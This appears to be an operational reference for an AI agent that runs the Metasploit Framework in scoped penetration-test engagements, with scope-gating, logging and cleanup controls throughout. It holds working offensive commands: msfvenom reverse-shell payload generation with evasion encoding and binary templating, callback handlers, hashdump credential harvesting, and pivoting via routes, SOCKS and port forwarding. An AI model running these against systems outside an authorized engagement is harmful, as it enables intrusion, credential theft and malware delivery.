# Metasploit Framework — operational reference (CLI + MCP)

The operational depth the setup skill points at: how the agent actually drives the **open-source Framework** once `metasploit-setup` has provisioned it. Every act here is still gated — read the engagement scope file before each target-touching command, log it with its ATT&CK id, and keep the nine controls. This reference is decision-oriented, not a manual reprint; `msfconsole`'s own `help`, `info` and `show` commands are the exhaustive source.

> **Boundary.** This is the Framework (`msfconsole`, modules, `msfvenom`, the `msfdb` workspace, the MCP server). Metasploit **Pro** — the licensed GUI product, its MetaModules, task chains, wizards and REST/RPC APIs — is `references/metasploit-pro.md`.

## 1. The msfconsole loop

The whole console reduces to: find a module, read it, set it, run it, handle the result.

| Intent | Command | Notes |
|---|---|---|
| Find a module | `search cve:2021-44228`, `search type:exploit platform:windows smb`, `search name:log4shell` | Filter by `type:`, `platform:`, `rank:`, `cve:`; `search` is noise-free (local DB) |
| Read it before use | `info <module>` | Options, targets, references, disclosure date, reliability rank — **always read before run** |
| Select it | `use exploit/windows/smb/ms17_010_eternalblue` | `use <index>` after a search; `back` to leave |
| See what it needs | `show options`, `show targets`, `show payloads`, `show advanced` | Required options have no default |
| Configure | `set RHOSTS 10.10.0.5`, `set LHOST tun0`, `set TARGET 2` | `setg` sets globally across modules; `unset` / `unsetg` clears |
| Dry-run | `check` | Only some exploits support it; proves vulnerable **without** firing — prefer it first |
| Fire | `run` / `exploit`, `exploit -j` (background), `exploit -z` (don't interact) | `-j` is how you keep the console while a handler waits |
| Manage sessions | `sessions -l`, `sessions -i 1`, `background` / Ctrl-Z, `sessions -K` (kill all) | One session = one foothold; `sessions -u 1` upgrades a shell to meterpreter |

**Module ranks** (in `info`) are a reliability signal, not a quality one: `excellent`/`great` modules do not risk the service; `average`/`low`/`manual` and anything memory-corruption may crash it — those are the ones control 3 gates as availability-risking, never run against production without the second sign-off.

## 2. The database & workspaces — what feeds recon and the report

`metasploit-setup` stood up `msfdb` and an engagement workspace. Inside the console it is the shared memory recon writes to and the report reads from.

```
db_status                      # connected to msf (postgresql)
workspace                      # list; the active one has a *
workspace engagement-<NNN>     # switch; keep each engagement isolated

db_nmap -sV -sC 10.10.0.0/24   # nmap whose results land straight in the DB
db_import scan.xml             # import an external nmap/nessus/burp export

hosts                          # discovered hosts
services -p 445                # services, filter by port/proto/name
vulns                          # correlated vulnerabilities
creds                          # recovered credentials  (REDACTED in the report — control 7)
loot                           # files/hashes pulled    (REDACTED in the report)
notes                          # freeform findings
analyze                        # per-host: suggested modules from what's known
```

- `hosts -R` sets `RHOSTS` from the current host filter — the clean way to scope a module to exactly what recon found, never a hand-typed range that might cross an exclusion.
- Everything in the DB is engagement loot: the report cites *that* a cred/host/file was found and its blast radius, never contents, never the DB file (control 7).

## 3. Module taxonomy

| Type | Path root | Does | Used in step |
|---|---|---|---|
| `exploit` | `exploit/` | Delivers a payload through a vulnerability | initial-access |
| `auxiliary` | `auxiliary/` | Scanners, fuzzers, DoS (never run the DoS ones), admin, gather — no payload | recon, credential-attacks |
| `post` | `post/` | Runs *through an existing session* — enum, harvest, pivot, persistence | priv-esc, post-exploitation |
| `payload` | `payload/` | The code that runs on target (see §4) | initial-access |
| `encoder` / `nop` / `evasion` | `encoder/`… | Encode/pad/evade — AV-evasion is an allowed technique only when the scope file lists it | per scope |

`auxiliary/scanner/*` (e.g. `smb/smb_ms17_010`, `ssh/ssh_login`) are the DB-aware recon multipliers — they take `RHOSTS` ranges and write hosts/services/creds back. `ssh_login`, `smb_login`, etc. are online credential checks — coordinate blast-radius cap and lockout policy (credential-attacks owns the discipline).

## 4. Payloads & msfvenom

A **payload** is what executes on target after the exploit lands. Two axes decide which:

- **Staged** (`windows/x64/meterpreter/reverse_tcp`) sends a small stager that pulls the rest — smaller initial footprint, needs a matching handler. **Stageless** (`..._meterpreter_reverse_tcp`, note the single word) is self-contained — one artifact, better across flaky links. The `/` vs `_` before `meterpreter` is the tell.
- **Connection direction**: `reverse_*` calls back to your `LHOST` (beats inbound firewalls — the default); `bind_*` listens on target (needs an inbound path). Match `LHOST`/`LPORT` to the routable attacker interface (`tun0`/the lab bridge), never the wrong NIC.

`msfvenom` generates a payload as a standalone artifact (a file to drop, not an exploit-delivered one):

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=tun0 LPORT=4444 \
  -f exe -o /tmp/eng-<NNN>/payload.exe           # -f: exe, elf, raw, psh, python, war, apk...
msfvenom --list payloads | grep meterpreter       # enumerate
msfvenom -p ... -e x64/xor_dynamic -i 3 ...        # encode (scope-permitted evasion only)
msfvenom -p ... -x /path/legit.exe ...             # template into a real binary
```

Any artifact written to target is a planted artifact: record it in the action log and enumerate it in cleanup verification (control 4).

## 5. Handlers — catching the callback

A `reverse_*` payload needs something listening. The generic catcher:

```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter_reverse_tcp   # must MATCH the payload exactly
set LHOST tun0
set LPORT 4444
exploit -j                                         # background; -z = don't auto-interact
```

Payload and handler mismatch = no session. `exploit -j -z` plus `set ExitOnSession false` keeps the handler catching multiple callbacks (e.g. a phishing or mass-exploit run within scope).

## 6. Meterpreter & post-exploitation

Once a meterpreter session is interactive (`sessions -i N`):

| Intent | Command |
|---|---|
| Who/where am I | `getuid`, `sysinfo`, `getpid` |
| Stabilise | `migrate <pid>` (into a stable process), `ps` to pick one |
| Files | `ls`, `download`, `upload`, `cat`, `edit` |
| Privilege | `getsystem` (Windows), `getprivs` — priv-esc owns the deeper chains (linPEAS/GTFOBins) |
| Harvest | run `post/` modules: `post/windows/gather/hashdump`, `post/multi/gather/*` — loot → DB, REDACTED in report |
| Shell | `shell` (drop to native), `Ctrl-Z` back to meterpreter |

Prove impact at the minimum footprint (control: count rows, don't dump them; one persistence mechanism, demonstrated then removed). `run post/multi/manage/shell_to_meterpreter` upgrades a plain shell.

## 7. Routing & pivoting — hands off to lateral-movement

From a foothold, reach deeper in-scope hosts **without** touching anything the scope file excludes:

```
run post/multi/manage/autoroute               # add routes for the session's subnets
# or: route add 10.10.20.0/24 <session-id>
use auxiliary/server/socks_proxy              # SOCKS for external tools through the route
set VERSION 5
run -j
# then portfwd from inside meterpreter:
portfwd add -l 3389 -p 3389 -r 10.10.20.9
```

Routing is scope-bounded: a route or proxy that would reach an excluded host is control-9 abort territory. `lateral-movement` owns the technique depth (ligolo-ng/chisel, NetExec, impacket); this is the Metasploit-native path.

## 8. Resource scripts — reproducible runs

A `.rc` file is a batch of console commands — the reproducible, logged alternative to typing:

```
msfconsole -q -r engagement-<NNN>.rc          # run at startup
# inside the console:
makerc /tmp/eng-<NNN>/session.rc               # record everything typed this session
resource /path/to.rc                            # run one now
set AutoRunScript multi_console_command -rc post.rc   # auto-run on each new session
```

Resource scripts can embed Ruby (`<ruby>…</ruby>`) for logic the console lacks. They are the Framework analog of Pro's task chains (which cannot run Ruby — see the Pro reference) and the natural artifact to attach to the report for reproducibility.

## 9. The Metasploit MCP server — the agent's hands

`metasploit-setup` registered `msfmcpd`. These are the 16 tools the agent calls instead of scraping console text. They talk to the same workspace DB and RPC the console uses.

**Read-only (12) — always enabled, map to recon/enumeration/reading state:**

| Tool | Returns | Console analog |
|---|---|---|
| `msf_search_modules` | modules by keyword/CVE/name (500-char cap) | `search` |
| `msf_module_info` | options, targets, refs, authors | `info` |
| `msf_host_info` | hosts in the workspace DB | `hosts` |
| `msf_service_info` | services in the DB | `services` |
| `msf_vulnerability_info` | correlated vulns | `vulns` |
| `msf_note_info` | notes | `notes` |
| `msf_credential_info` | creds (handle as loot) | `creds` |
| `msf_loot_info` | loot (handle as loot) | `loot` |
| `msf_module_results` | result of a run by UUID | — |
| `msf_running_stats` | waiting/running/completed run UUIDs | `jobs` |
| `msf_session_list` | active sessions | `sessions -l` |
| `msf_session_read` | non-destructive read from a session | reading session output |

**Dangerous (4) — disabled by default; enabled only for the exploitation window, each call still passing the nine-control gate:**

| Tool | Does | Console analog | Gate |
|---|---|---|---|
| `msf_module_execute` | runs a module as a background job | `run`/`exploit -j` | per-act opt-in (control 3); re-read scope; log with ATT&CK id |
| `msf_module_check` | runs a module's `check` method | `check` | prefer before execute — proves vuln without firing |
| `msf_session_stop` | terminates a session | `sessions -k` | cleanup act — log it |
| `msf_session_write` | sends data to a session (≤10 000 chars/call) | typing into a session | each command is a target-touching act |

The server enforces its own input safety (JSON schemas, IP/CIDR validation, restricted workspace names, port-range checks, rate limit) — lean on it. The default posture is read-only: drive recon and all workspace reads through the 12 safe tools, and either enable the 4 dangerous tools only for exploitation or run the actual exploit through logged `msfconsole` Bash — same gate, same action log.

## Gate reminders (the nine controls, applied here)

- Read `docs/security/engagement-<NNN>.md` before every target-touching command; `RHOSTS` comes from `hosts -R`, never a hand-typed range that might cross an exclusion.
- `check` before `exploit`; never a DoS `auxiliary/dos/*` module; memory-corruption/`manual`-rank modules are availability-risking → per-act go-ahead, never production.
- Every artifact `msfvenom` wrote or a module uploaded is enumerated in cleanup verification with the command that confirmed removal.
- Creds/loot/hashes in the DB are reported as *that they were recovered* + blast radius, redacted — never contents, never the DB file.
- Every module run, payload and session command goes in the action log as you go, with its ATT&CK id.
